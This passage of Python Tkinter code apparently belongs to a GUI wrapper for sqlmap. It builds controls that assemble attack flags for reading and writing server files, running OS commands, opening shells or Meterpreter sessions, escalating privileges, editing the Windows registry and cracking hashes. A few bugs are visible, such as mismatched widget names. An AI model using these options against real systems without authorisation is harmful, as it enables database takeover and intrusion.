        access_f.add(file_acc, text='File system')
        access_f.add(os_acc, text='Operating system')
        access_f.add(win_reg_acc, text='Windows registry')
        access_f.columnconfigure(0, weight=1)
        access_f.grid(sticky='nswe', pady=5, padx=5)
        #
        file_acc.columnconfigure(0, weight=1)
        # FILE SYSTEM
        file_read_lf = ttk.Labelframe(file_acc, text='')
        file_read_lf.grid(sticky='we', ipady=3)
        # --file-read=RFILE   Read a file from the back-end DBMS file system:
        self.chk_file_read = ttk.Checkbutton(file_read_lf)
        self.chk_file_read_var = tkinter.StringVar()
        self.chk_file_read.config(text="file-read ", variable=self.chk_file_read_var, onvalue="on",
                                  offvalue="off", command=self.f_file_read)
        self.chk_file_read.grid(row=0, column=0, sticky='w')
        #
        self.e_file_read = ttk.Entry(file_read_lf, width=60)
        self.e_file_read.grid(row=0, column=1, sticky='w', padx=3)
        # --file-write=WFILE  Write a local file on the back-end DBMS file system
        self.file_write_var = tkinter.StringVar()
        self.chk_file_write = ttk.Checkbutton(file_read_lf)
        self.chk_file_write.config(text="file-write", variable=self.file_write_var, onvalue="on",
                                   offvalue="off", command=self.f_file_write)
        self.chk_file_write.grid(row=1, column=0, sticky='w')
        #
        self.e_file_write_var = tkinter.StringVar()
        self.e_file_write = ttk.Entry(file_read_lf, width=60)
        self.e_file_write.config(text="", textvariable=self.e_file_write_var)
        self.e_file_write.grid(row=1, column=1, sticky='w', padx=3)
        #
        self.file_write = options_file_write = {}
        options_file_write['defaultextension'] = ''
        options_file_write['filetypes'] = [('all files', '.*')]
        options_file_write['initialdir'] = './shell/'
        options_file_write['parent'] = watch_log
        options_file_write['title'] = 'Open file-write'
        # --file-dest=DFILE   Back-end DBMS absolute filepath to write to:
        self.chk_file_dest = ttk.Checkbutton(file_read_lf)
        self.chk_file_dest_var = tkinter.StringVar()
        self.chk_file_dest.config(text="file-dest ", variable=self.chk_file_dest_var, onvalue="on",
                                  offvalue="off")
        self.chk_file_dest.grid(row=2, column=0, sticky='w')
        #
        self.e_file_dest = ttk.Entry(file_read_lf, width=60)
        self.e_file_dest.grid(row=2, column=1, sticky='w', padx=3)
        # BUTTON
        self.view_file = ttk.Button(file_read_lf, width=10)
        self.view_file.config(text="view log", command=self.v_file)
        self.view_file.grid(row=0, column=3, sticky='ne', rowspan=2)
        # Default *log,*config
        config_dl = ttk.Panedwindow(file_acc, orient=tkinter.HORIZONTAL, width=100, height=240)
        config_dl.rowconfigure(0, weight=1)
        config_dl.columnconfigure(0, weight=1)
        #
        cat_lf = ttk.Labelframe(config_dl, text='Category')
        cat_lf.rowconfigure(0, weight=1)
        cat_lf.columnconfigure(0, weight=1)
        #
        list_lf = ttk.Labelframe(config_dl, text='Default *log, *config')
        list_lf.rowconfigure(0, weight=1)
        list_lf.columnconfigure(0, weight=1)
        #
        config_dl.add(cat_lf)
        config_dl.add(list_lf)
        config_dl.grid(row=1, columnspan=2, sticky='we', pady=5)
        # Category ./SQM/PATH_TRAVERSAL*.txt
        self.Lcat = tkinter.Listbox(cat_lf, height=100, width=20, selectmode=tkinter.EXTENDED)

        files_cat = os.listdir('./SQM/PATH_TRAVERSAL')
        cats = filter(lambda x: x.endswith('.txt'), files_cat)
        for cat_list in cats:
            cat_list = cat_list.replace('.txt', '')
            self.Lcat.insert(tkinter.END, cat_list)
        self.Lcat.grid(row=0, column=0, sticky='we')
        self.Lcat.columnconfigure(0, weight=1)
        self.Lcat.bind("<Double-Button-1>", self.show_def_log)
        # Scroll
        scrollcat = ttk.Scrollbar(cat_lf, orient=tkinter.VERTICAL, command=self.Lcat.yview)
        self.Lcat['yscrollcommand'] = scrollcat.set
        scrollcat.grid(row=0, column=1, sticky='ns')
        # Show Default *log, *config
        s_def_log = ttk.Scrollbar(list_lf)
        s_def_log.grid(row=0, column=1, sticky='ns')
        #
        self.d_log_txt = tkinter.Text(list_lf, yscrollcommand=s_def_log.set, width=73,
                                      height=50, bg='#002B36', fg='#93A1A1')
        s_def_log.config(command=self.d_log_txt.yview)
        self.d_log_txt.grid(row=0, column=0, ipadx=30, sticky='nswe')
        # OPERATING SYSTEM ACCESS
        os_acc_lf = ttk.Labelframe(os_acc, text='')
        os_acc_lf.grid(sticky='we', ipady=3)
        os_acc_lf.columnconfigure(0, weight=1)
        # --os-cmd=OSCMD      Execute an operating system command
        self.chk_os_cmd = ttk.Checkbutton(os_acc_lf)
        self.chk_os_cmd_var = tkinter.StringVar()
        self.chk_os_cmd.config(text="os-cmd", variable=self.chk_os_cmd_var, onvalue="on",
                               offvalue="off", command=self.f_os_cmd)
        self.chk_os_cmd.grid(row=0, column=0, sticky='w')
        #
        self.e_os_cmd = ttk.Entry(os_acc_lf, width=60)
        self.e_os_cmd.grid(row=0, column=1, sticky='we', padx=3)
        # --os-shell          Prompt for an interactive operating system shell
        self.chk_os_shell = ttk.Checkbutton(os_acc_lf)
        self.chk_os_shell_var = tkinter.StringVar()
        self.chk_os_shell.config(text="os-shell", variable=self.chk_os_shell_var, onvalue="on",
                                 offvalue="off", command=self.f_os_shell)
        self.chk_os_shell.grid(row=1, column=0, sticky='w')
        # --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
        self.chk_os_pwn = ttk.Checkbutton(os_acc_lf)
        self.chk_os_pwn_var = tkinter.StringVar()
        self.chk_os_pwn.config(text="os-pwn", variable=self.chk_os_pwn_var, onvalue="on",
                               offvalue="off", command=self.f_os_pwn)
        self.chk_os_pwn.grid(row=2, column=0, sticky='w')
        # --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
        self.chk_os_smbrelay = ttk.Checkbutton(os_acc_lf)
        self.chk_os_smbrelay_var = tkinter.StringVar()
        self.chk_os_smbrelay.config(text="os-smbrelay", variable=self.chk_os_smbrelay_var, onvalue="on",
                                    offvalue="off", command=self.f_os_smbrelay)
        self.chk_os_smbrelay.grid(row=3, column=0, sticky='w')
        # --os-bof            Stored procedure buffer overflow exploitation
        self.chk_os_bof = ttk.Checkbutton(os_acc_lf)
        self.chk_os_bof_var = tkinter.StringVar()
        self.chk_os_bof.config(text="os-bof", variable=self.chk_os_bof_var, onvalue="on",
                               offvalue="off", command=self.f_os_bof)
        self.chk_os_bof.grid(row=4, column=0, sticky='w')
        # --priv-esc          Database process' user privilege escalation
        self.chk_priv_esc = ttk.Checkbutton(os_acc_lf)
        self.chk_priv_esc_var = tkinter.StringVar()
        self.chk_priv_esc.config(text="priv-esc", variable=self.chk_priv_esc_var, onvalue="on",
                                 offvalue="off", command=self.f_priv_esc)
        self.chk_priv_esc.grid(row=5, column=0, sticky='w')
        # --msf-path=MSFPATH  Local path where Metasploit Framework is installed
        self.chk_msf_path = ttk.Checkbutton(os_acc_lf)
        self.chk_msf_path_var = tkinter.StringVar()
        self.chk_msf_path.config(text="msf-path", variable=self.chk_msf_path_var, onvalue="on",
                                 offvalue="off", command=self.f_msf_path)
        self.chk_msf_path.grid(row=6, column=0, sticky='w')
        #
        self.e_msf_path_var = tkinter.StringVar()
        self.e_read_msf_path = ttk.Entry(os_acc_lf, width=60)
        self.e_read_msf_path.grid(row=6, column=1, sticky='we', padx=3)
        self.e_read_msf_path.config(text="", textvariable=self.e_msf_path_var)
        # --tmp-path=TMPPATH  Remote absolute path of temporary files directory
        self.chk_tmp_path = ttk.Checkbutton(os_acc_lf)
        self.chk_tmp_path_var = tkinter.StringVar()
        self.chk_tmp_path.config(text="tmp-path", variable=self.chk_tmp_path_var, onvalue="on",
                                 offvalue="off", command=self.f_tmp_path)
        self.chk_tmp_path.grid(row=7, column=0, sticky='w')
        #
        self.e_tmp_path = ttk.Entry(os_acc_lf, width=60)
        self.e_tmp_path.grid(row=7, column=1, sticky='we', padx=3)
        # WINDOWS REGISTRY
        win_reg_acc_lf = ttk.Labelframe(win_reg_acc, text='')
        win_reg_acc_lf.grid(sticky='we', ipady=3)
        win_reg_acc_lf.columnconfigure(0, weight=1)
        # --reg-read          Read a Windows registry key value
        self.chk_reg_read = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_read_var = tkinter.StringVar()
        self.chk_reg_read.config(text="reg-read", variable=self.chk_reg_read_var, onvalue="on",
                                 offvalue="off", command=self.f_reg_read)
        self.chk_reg_read.grid(row=0, column=0, sticky='w')
        # --reg-add           Write a Windows registry key value data
        self.chk_reg_add = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_add_var = tkinter.StringVar()
        self.chk_reg_add.config(text="reg-add", variable=self.chk_reg_add_var, onvalue="on",
                                offvalue="off", command=self.f_reg_add)
        self.chk_reg_add.grid(row=1, column=0, sticky='w')
        # --reg-del           Delete a Windows registry key value
        self.chk_reg_del = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_del_var = tkinter.StringVar()
        self.chk_reg_del.config(text="reg-del", variable=self.chk_reg_del_var, onvalue="on",
                                offvalue="off", command=self.f_reg_del)
        self.chk_reg_del.grid(row=2, column=0, sticky='w')
        # --reg-key=REGKEY    Windows registry key
        self.chk_reg_key = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_key_var = tkinter.StringVar()
        self.chk_reg_key.config(text="reg-key", variable=self.chk_reg_key_var, onvalue="on",
                                offvalue="off", command=self.f_reg_key)
        self.chk_reg_key.grid(row=3, column=0, sticky='w')
        #
        self.e_reg_key = ttk.Entry(win_reg_acc_lf, width=60)
        self.e_reg_key.grid(row=3, column=1, sticky='we', padx=3)
        # --reg-value=REGVAL  Windows registry key value
        self.chk_reg_value = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_value_var = tkinter.StringVar()
        self.chk_reg_value.config(text="reg-value", variable=self.chk_reg_value_var, onvalue="on",
                                  offvalue="off", command=self.f_reg_value)
        self.chk_reg_value.grid(row=4, column=0, sticky='w')
        #
        self.e_reg_value = ttk.Entry(win_reg_acc_lf, width=60)
        self.e_reg_value.grid(row=4, column=1, sticky='we', padx=3)
        # --reg-data=REGDATA  Windows registry key value data
        self.chk_reg_data = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_data_var = tkinter.StringVar()
        self.chk_reg_data.config(text="reg-data", variable=self.chk_reg_data_var, onvalue="on",
                                 offvalue="off", command=self.f_reg_data)
        self.chk_reg_data.grid(row=5, column=0, sticky='w')
        #
        self.e_reg_data = ttk.Entry(win_reg_acc_lf, width=60)
        self.e_reg_data.grid(row=5, column=1, sticky='we', padx=3)
        # --reg-type=REGTYPE  Windows registry key value type
        self.chk_reg_type = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_type_var = tkinter.StringVar()
        self.chk_reg_type.config(text="reg-type", variable=self.chk_reg_type_var, onvalue="on",
                                 offvalue="off", command=self.f_reg_type)
        self.chk_reg_type.grid(row=6, column=0, sticky='w')
        #
        self.e_reg_type = ttk.Entry(win_reg_acc_lf, width=60)
        self.e_reg_type.grid(row=6, column=1, sticky='we', padx=3)
        # API
        api_options = ttk.Labelframe(api_f, text='Api')
        api_options.grid(row=0, sticky='we', column=0, pady=10)
        # --api
        self.chk_api = ttk.Checkbutton(api_options)
        self.chk_api_var = tkinter.StringVar()
        self.chk_api.config(text="api", variable=self.chk_chunked_var, onvalue="on",
                            offvalue="off", command=self.f_api)
        self.chk_api.grid(row=0, column=0, sticky='w')
        # --taskid
        self.chk_task_id = ttk.Checkbutton(api_options)
        self.chk_task_id_var = tkinter.StringVar()
        self.chk_task_id.config(text="taskid", variable=self.chk_task_id_var, onvalue="on",
                                offvalue="off", command=self.f_task_id)
        self.chk_task_id.grid(row=0, column=1, sticky='w')
        # --database
        self.chk_database = ttk.Checkbutton(api_options)
        self.chk_database_var = tkinter.StringVar()
        self.chk_database.config(text="database", variable=self.chk_database_var, onvalue="on",
                                 offvalue="off", command=self.f_database)
        self.chk_database.grid(row=0, column=2, sticky='w')

    # ####################################################
    #                Functions:                          #
    # ####################################################
    # Targets:
    def f_target(self):
        try:
            selection = self.varTarget.get()
            if selection == "url":
                pass
            elif selection == "logFile":
                filename = tkinter.filedialog.askopenfile(mode='r')
                self.urlentry.set(filename.name)
            elif selection == "bulkFile":
                filename = tkinter.filedialog.askopenfile(mode='r', **self.file_request_save)
                self.urlentry.set(filename.name)
            elif selection == "requestFile":
                filename = tkinter.filedialog.askopenfile(mode='r', **self.file_request_save)
                self.urlentry.set(filename.name)
            elif selection == "googleDork":
                filename = tkinter.filedialog.askopenfile(mode='r', **self.file_request_save)
                self.urlentry.set(filename.name)
            elif selection == "direct":
                pass
            elif selection == "configFile":
                filename = tkinter.filedialog.askopenfile(mode='r', **self.file_ini)
                self.urlentry.set(filename.name)
            elif selection == "sitemapurl":
                filename = tkinter.filedialog.askopenfile(mode='r', **self.file_request_save)
                self.urlentry.set(filename.name)
        except:
            pass

    # --beep              Sound alert when SQL injection found
    @property
    def f_beep(self):
        sql_beep = self.chk_beep_var.get()
        if sql_beep == "on":
            beep_sql = ' --beep'
        else:
            beep_sql = ""
        return beep_sql

    # --skip-static       Skip testing parameters that not appear dynamic
    @property
    def f_skip_static(self):
        sql_skip_static = self.chk_skip_static_var.get()
        if sql_skip_static == "on":
            skip_static_sql = ' --skip-static'
        else:
            skip_static_sql = ''
        return skip_static_sql

    # --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
    @property
    def f_cleanup(self):
        sql_cleanup = self.chk_cleanup_var.get()
        if sql_cleanup == "on":
            cleanup_sql = ' --cleanup'
        else:
            cleanup_sql = ""
        return cleanup_sql

    # --murphy-rate
    @property
    def f_murphy_rate(self):
        sql_murphy_rate = self.chk_murphy_rate_var.get()
        if sql_murphy_rate == "on":
            murphy_rate_sql = ' --murphy-rate'
        else:
            murphy_rate_sql = ""
        return murphy_rate_sql

    # --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
    @property
    def f_skip_heuristics(self):
        sql_skip_heuristics = self.chk_skip_heuristics_var.get()
        if sql_skip_heuristics == "on":
            skip_heuristics_sql = ' --skip-heuristics'
        else:
            skip_heuristics_sql = ""
        return skip_heuristics_sql

    # --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
    @property
    def f_skip_waf(self):
        sql_skip_waf = self.chk_skip_waf_var.get()
        if sql_skip_waf == "on":
            skip_waf_sql = ' --skip-waf'
        else:
            skip_waf_sql = ""
        return skip_waf_sql

    # --offline           Work in offline mode (only use session data)
    @property
    def f_offline(self):
        sql_offline = self.chk_offline_var.get()
        if sql_offline == "on":
            offline_sql = ' --offline'
        else:
            offline_sql = ""
        return offline_sql

    # --sqlmap-shell      Prompt for an interactive sqlmap shell
    @property
    def f_sqlmap_shell(self):
        sql_sqlmap_shell = self.chk_sqlmap_shell_var.get()
        if sql_sqlmap_shell == "on":
            sqlmap_shell_sql = ' --sqlmap-shell'
        else:
            sqlmap_shell_sql = ""
        return sqlmap_shell_sql

    # --tmp-dir=TMPDIR    Local directory for storing temporary files
    def f_tmp_dir(self, *args):
        sql_tmp_dir = self.chk_tmp_dir_var.get()
        if sql_tmp_dir == "on":
            tmp_dir_sql = ' --tmp-dir=""%s""' % (self.e_tmp_dir.get())
        else:
            tmp_dir_sql = ""
        return tmp_dir_sql

    # --web-root=WEBROOT    Web server document root directory (e.g. "/var/www")
    def f_web_root(self, *args):
        sql_web_root = self.chk_web_root_var.get()
        if sql_web_root == "on":
            self.e_web_root.config(state='normal')
            web_root_sql = ' --web-root=""%s""' % (self.e_web_root.get())
        else:
            self.e_web_root.config(state='disabled')
            web_root_sql = ""
        return web_root_sql

    # --disable-precon     Disable preconnection of sqlmap (check for 200 answer - may abuse some WAFs)
    def f_disable_precon(self):
        sql_disable_precon = self.chk_disable_precon_var.get()
        if sql_disable_precon == "on":
            disable_precon_sql = ' --disable-precon'
        else:
            disable_precon_sql = ""
        return disable_precon_sql
    
    # --dump-file=DUMP.. Store dumped data to a custom file
    def f_dump_file(self):
        sql_dump_file = self.chk_dump_file_var.get()
        if sql_dump_file == "on":
            dump_file = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
            if dump_file:
                self.e_dump_file_var.set(dump_file.name)
        elif sql_dump_file == "off":
            self.e_dump_file_var.set("")

    # --dump-file=DUMP.. Store dumped data to a custom file
    @property
    def f_save_dump_file(self):
        sql_save_dump_file = self.e_dump_file_var.get()
        if sql_save_dump_file != "":
            save_dump_file_sql = ' --dump-file="%s"' % sql_save_dump_file
        else:
            save_dump_file_sql = ""
        return save_dump_file_sql

    # --dependencies      Check for missing sqlmap dependencies
    @property
    def f_dependencies(self):
        sql_dependencies = self.chk_dependencies_var.get()
        if sql_dependencies == "on":
            dependencies_sql = ' --dependencies'
        else:
            dependencies_sql = ""
        return dependencies_sql

    # --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    @property
    def f_gpage(self):
        sql_gpage = self.chk_gpage_var.get()
        if sql_gpage == "on":
            gpage_sql = ' --gpage="%s"' % (self.e_gpage.get())
        else:
            gpage_sql = ""
        return gpage_sql

    # -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    @property
    def f_z(self):
        sql_z = self.chk_z_var.get()
        if sql_z == "on":
            z_sql = ' -z "%s"' % (self.e_z.get())
        else:
            z_sql = ""
        return z_sql

    # --mobile            Imitate smartphone through HTTP User-Agent header
    @property
    def f_mobile(self):
        sql_mobile = self.chk_mobile_var.get()
        if sql_mobile == "on":
            mobile_sql = ' --mobile'
        else:
            mobile_sql = ""
        return mobile_sql

    # --page-rank         Display page rank (PR) for Google dork results
    @property
    def f_page_rank(self):
        sql_page_rank = self.chk_page_rank_var.get()
        if sql_page_rank == "on":
            page_rank_sql = ' --page-rank'
        else:
            page_rank_sql = ""
        return page_rank_sql

    # --base64    Parameter(s) containing Base64 encoded values
    @property
    def f_base64(self):
        sql_base64 = self.chk_base64_var.get()
        if sql_base64 == "on":
            base64_sql = ' --base64'
        else:
            base64_sql = ""
        return base64_sql

    # --base64-safe    Use URL and filename safe Base64 alphabet
    # (Reference: https://en.wikipedia.org/wiki/Base64#URL_applications)
    @property
    def f_base64safe(self):
        sql_base64safe = self.chk_base64safe_var.get()
        if sql_base64safe == "on":
            base64safe_sql = ' --base64-safe'
        else:
            base64safe_sql = ""
        return base64safe_sql

    # --purge     Safely remove all content from output directory
    @property
    def f_purge(self):
        sql_purge = self.chk_purge_var.get()
        if sql_purge == "on":
            purge_sql = ' --purge'
        else:
            purge_sql = ""
        return purge_sql

    # --smart             Conduct through tests only if positive heuristic(s)
    @property
    def f_smart(self):
        sql_smart = self.chk_smart_var.get()
        if sql_smart == "on":
            smart_sql = ' --smart'
        else:
            smart_sql = ""
        return smart_sql

    # --wizard            Simple wizard interface for beginner users
    @property
    def f_wizard(self):
        sql_wizard = self.chk_wizard_var.get()
        if sql_wizard == "on":
            wizard_sql = ' --wizard'
        else:
            wizard_sql = ""
        return wizard_sql

    # --dummy
    @property
    def f_dummy(self):
        sql_dummy = self.chk_dummy_var.get()
        if sql_dummy == "on":
            dummy_sql = ' --dummy'
        else:
            dummy_sql = ""
        return dummy_sql

    # --crack             Load and crack hashes from a file (standalone)
    def f_crack(self):
        sql_crack = self.chk_crack_var.get()
        if sql_crack == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.e_crack_var.set(filename.name)
        elif sql_crack == "off":
            self.e_crack_var.set("")
        return

    # --crack             Load and crack hashes from a file (standalone)
    @property
    def f_read_crack(self):
        sql_read_crack = self.e_crack_var.get()
        if sql_read_crack != "":
            read_crack_sql = ' --crack="%s"' % sql_read_crack
        else:
            read_crack_sql = ""
        return read_crack_sql

    # --debug
    @property
    def f_debug(self):
        sql_debug = self.chk_debug_var.get()
        if sql_debug == "on":
            debug_sql = ' --debug'
        else:
            debug_sql = ""
        return debug_sql

    # --disable-stats
    @property
    def f_disable_stats(self):
        sql_disable_stats = self.chk_disable_stats_var.get()
        if sql_disable_stats == "on":
            disable_stats_sql = ' --disable-stats'
        else:
            disable_stats_sql = ""
        return disable_stats_sql

    # --profile
    @property
    def f_profile(self):
        sql_profile = self.chk_profile_var.get()
        if sql_profile == "on":
            profile_sql = ' --profile'
        else:
            profile_sql = ""
        return profile_sql

    # --force-dbms
    @property
    def f_force_dbms(self):
        sql_force_dbms = self.chk_force_dbms_var.get()
        if sql_force_dbms == "on":
            force_dbms_sql = ' --force-dbms'
        else:
            force_dbms_sql = ""
        return force_dbms_sql

    # --alert=ALERT       Run shell command(s) when SQL injection is found
    @property
    def f_alert(self):
        sql_alert = self.chk_alert_var.get()
        if sql_alert == "on":
            alert_sql = ' --alert="%s"' % (self.e_alert.get())
        else:
            alert_sql = ""
        return alert_sql

    # --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
    def f_answers(self, *args):
        sql_answers = self.chk_answers_var.get()
        if sql_answers == "on":
            self.e_answers.config(state='normal')
            answers_sql = ' --answers="%s"' % (self.e_answers_value.get())
        else:
            self.e_answers.config(state='disabled')
            answers_sql = ""
        return answers_sql

    # --disable-coloring            Disable console output coloring
    @property
    def f_disable_coloring(self):
        sql_disable_coloring = self.chk_disable_coloring_var.get()
        if sql_disable_coloring == "on":
            disable_colorinng_sql = ' --disable-coloring'
        else:
            disable_colorinng_sql = ""
        return disable_colorinng_sql

    # -s SESSIONFILE      Save and resume all data retrieved on a session file
    def f_session_file(self):
        sql_session_file = self.chk_session_file_var.get()
        if sql_session_file == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.e_session_file_var.set(filename.name)
        elif sql_session_file == "off":
            self.e_session_file_var.set("")
        return

    # -s SESSIONFILE      Save and resume all data retrieved on a session file
    @property
    def f_read_session_file(self):
        sql_read_session_file = self.e_session_file_var.get()
        if sql_read_session_file != "":
            read_session_file_sql = ' -s "%s"' % sql_read_session_file
        else:
            read_session_file_sql = ""
        return read_session_file_sql

    # -t TRAFFICFILE      Log all HTTP traffic into a textual file
    def f_read_traffic_file(self):
        sql_read_traffic_file = self.chk_read_traffic_file_var.get()
        if sql_read_traffic_file == "on":
            read_traffic_file = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
            if read_traffic_file:
                self.e_traffic_file_var.set(read_traffic_file.name)
        elif sql_read_traffic_file == "off":
            self.e_traffic_file_var.set("")
        return

    # -t TRAFFICFILE      Log all HTTP traffic into a textual file
    @property
    def f_save_traffic_file(self):
        sql_save_traffic_file = self.e_traffic_file_var.get()
        if sql_save_traffic_file != "":
            save_traffic_file_sql = ' -t "%s"' % sql_save_traffic_file
        else:
            save_traffic_file_sql = ""
        return save_traffic_file_sql

    # Open Session FILE
    def f_open_session_file(self):
        session_file = tkinter.filedialog.askopenfile(mode='r', **self.file_session)
        if session_file:
            self.sesTXT.delete("1.0", tkinter.END)
            ses = session_file.read()
            self.sesTXT.insert(tkinter.END, ses)
            self.sesTXT.mark_set(tkinter.INSERT, '1.0')
            self.sesTXT.focus()

    # Open Traffic FILE
    def f_traffic_file(self):
        traffic_file = tkinter.filedialog.askopenfile(mode='r', **self.file_traf)
        if traffic_file:
            self.sesTXT.delete("1.0", tkinter.END)
            traffic = traffic_file.read()
            self.sesTXT.insert(tkinter.END, traffic)
            self.sesTXT.mark_set(tkinter.INSERT, '1.0')
            self.sesTXT.focus()

    # Req.File/Load/Save
    def save_req_f(self):
        filename = tkinter.filedialog.asksaveasfilename(**self.file_request_save)
        if filename:
            textoutput = self.reqFile.get(0.0, tkinter.END)
            open(filename, 'w').write(textoutput)

    def open_req_f(self):
        filename = tkinter.filedialog.askopenfile(mode='r', **self.file_request_save)
        if filename:
            self.reqFile.delete("1.0", tkinter.END)
            req = filename.read()
            self.reqFile.insert(tkinter.END, req)
            self.reqFile.mark_set(tkinter.INSERT, '1.0')
            self.reqFile.focus()

    #
    def open_ini_f(self):
        # self.file_ini
        filename = tkinter.filedialog.askopenfile(mode='r', **self.file_ini)
        if filename:
            self.reqFile.delete("1.0", tkinter.END)
            req = filename.read()
            self.reqFile.insert(tkinter.END, req)
            self.reqFile.mark_set(tkinter.INSERT, '1.0')
            self.reqFile.focus()

    #
    def save_ini_f(self):
        filename = tkinter.filedialog.asksaveasfilename(**self.file_ini)
        if filename:
            textoutput = self.reqFile.get(0.0, tkinter.END)
            open(filename, 'w').write(textoutput)

    #
    def show_def_log(self, *args):
        load_d_log = self.Lcat.curselection()
        self.d_log_TXT.delete("1.0", tkinter.END)
        if 1 == len(load_d_log):
            file_d_log = ','.join([self.Lcat.get(ind) for ind in load_d_log])
            self.d_log_TXT.insert(tkinter.END, open(r'./SQM/PATH_TRAVERSAL/' + file_d_log + '.txt', 'r').read())
            self.d_log_TXT.mark_set(tkinter.INSERT, '1.0')
            self.d_log_TXT.focus()
        else:
            self.d_log_TXT.insert(tkinter.END, u"Default-Log-File-Empty.")

    def v_file(self):
        load_file = self.e_file_read.get()
        self.sesTXT.delete("1.0", tkinter.END)
        load_file = load_file.replace("/", "_")
        load_host = self.read_host()
        try:
            log_size = os.path.getsize("./output/" + load_host + "/files/" + load_file)
            if log_size != 0:
                self.sesTXT.insert(tkinter.END, open(r"./output/" + load_host + "/files/" + load_file, 'r').read())
                self.sesTXT.mark_set(tkinter.INSERT, '1.0')
                self.sesTXT.focus()
            else:
                self.sesTXT.insert(tkinter.END, u"File-Empty. ")
        except (IOError, OSError):
            self.sesTXT.insert(tkinter.END, u"File-Not-Found.")
        return self.nRoot.select(tab_id=1)

    # --file-read=FILE..  Read a file from the back-end DBMS file system
    @property
    def f_file_read(self):
        sql_file_read = self.chk_file_read_var.get()
        if sql_file_read == "on":
            file_read_sql = ' --file-read="%s"' % (self.e_file_read.get())
        else:
            file_read_sql = ""
        return file_read_sql

    # --file-write=WFILE  Write a local file on the back-end DBMS file system
    def f_file_write(self):
        sql_file_write = self.file_write_var.get()
        if sql_file_write == "on":
            filename = tkinter.filedialog.askopenfile(mode='r', **self.file_write)
            if filename:
                self.e_file_write_var.set(filename.name)
        elif sql_file_write == "off":
            self.e_file_write_var.set("")
        return

    # --file-write=WFILE  Write a local file on the back-end DBMS file system
    @property
    def f_read_file_write(self):
        sql_read_file_write = self.e_file_write_var.get()
        if sql_read_file_write != "":
            read_file_write_sql = ' --file-write="%s"' % sql_read_file_write
        else:
            read_file_write_sql = ""
        return read_file_write_sql

    # --file-dest=DFILE   Back-end DBMS absolute filepath to write to
    @property
    def f_file_dest(self):
        sql_file_dest = self.chk_file_dest_var.get()
        if sql_file_dest == "on":
            file_dest_sql = ' --file-dest="%s"' % (self.e_file_dest.get())
        else:
            file_dest_sql = ""
        return file_dest_sql

    # --os-cmd=OSCMD      Execute an operating system command
    @property
    def f_os_cmd(self):
        sql_os_cmd = self.chk_os_cmd_var.get()
        if sql_os_cmd == "on":
            os_cmd_sql = ' --os-cmd="%s"' % (self.e_os_cmd.get())
        else:
            os_cmd_sql = ""
        return os_cmd_sql

    # --os-shell          Prompt for an interactive operating system shell
    @property
    def f_os_shell(self):
        sql_os_shell = self.chk_os_shell_var.get()
        if sql_os_shell == "on":
            os_shell_sql = ' --os-shell'
        else:
            os_shell_sql = ""
        return os_shell_sql

    # --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
    @property
    def f_os_pwn(self):
        sql_os_pwn = self.chk_os_pwn_var.get()
        if sql_os_pwn == "on":
            os_pwn_sql = ' --os-pwn'
        else:
            os_pwn_sql = ""
        return os_pwn_sql

    # --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
    @property
    def f_os_smbrelay(self):
        sql_os_smbrelay = self.chk_os_smbrelay_var.get()
        if sql_os_smbrelay == "on":
            os_smbrelay_sql = ' --os-smbrelay'
        else:
            os_smbrelay_sql = ""
        return os_smbrelay_sql

    # --os-bof            Stored procedure buffer overflow exploitation
    @property
    def f_os_bof(self):
        sql_os_bof = self.chk_os_bof_var.get()
        if sql_os_bof == "on":
            os_bof_sql = ' --os-bof'
        else:
            os_bof_sql = ""
        return os_bof_sql

    # --priv-esc          Database process' user privilege escalation
    @property
    def f_priv_esc(self):
        sql_priv_esc = self.chk_priv_esc_var.get()
        if sql_priv_esc == "on":
            priv_esc_sql = ' --priv-esc'
        else:
            priv_esc_sql = ""
        return priv_esc_sql

    # --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    def f_msf_path(self):
        sql_msf_path = self.chk_msf_path_var.get()
        if sql_msf_path == "on":
            msf_path_sql = tkinter.filedialog.askdirectory()
            if msf_path_sql:
                self.e_msf_path_var.set(msf_path_sql)
        elif sql_msf_path == "off":
            self.e_msf_path_var.set("")
        return

    # --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    @property
    def f_read_msf_path(self):
        sql_read_msf_path = self.chk_msf_path_var.get()
        if sql_read_msf_path == "on":
            read_msf_path_sql = ' --msf-path="%s"' % (self.e_read_msf_path.get())
        else:
            read_msf_path_sql = ""
        return read_msf_path_sql

    # --tmp-path=TMPPATH  Remote absolute path of temporary files directory
    @property
    def f_tmp_path(self):
        sql_tmp_path = self.chk_tmp_path_var.get()
        if sql_tmp_path == "on":
            tmp_path_sql = ' --tmp-path="%s"' % (self.e_tmp_path.get())
        else:
            tmp_path_sql = ""
        return tmp_path_sql

    # --reg-read          Read a Windows registry key value
    @property
    def f_reg_read(self):
        sql_reg_read = self.chk_reg_read_var.get()
        if sql_reg_read == "on":
            reg_read_sql = ' --reg-read'
        else:
            reg_read_sql = ""
        return reg_read_sql

    # --reg-add           Write a Windows registry key value data
    @property
    def f_reg_add(self):
        sql_reg_add = self.chk_reg_add_var.get()
        if sql_reg_add == "on":
            reg_add_sql = ' --reg-add'
        else:
            reg_add_sql = ""
        return reg_add_sql

    # --reg-del           Delete a Windows registry key value
    @property
    def f_reg_del(self):
        sql_reg_del = self.chk_reg_del_var.get()
        if sql_reg_del == "on":
            reg_del_sql = ' --reg-del'
        else:
            reg_del_sql = ""
        return reg_del_sql

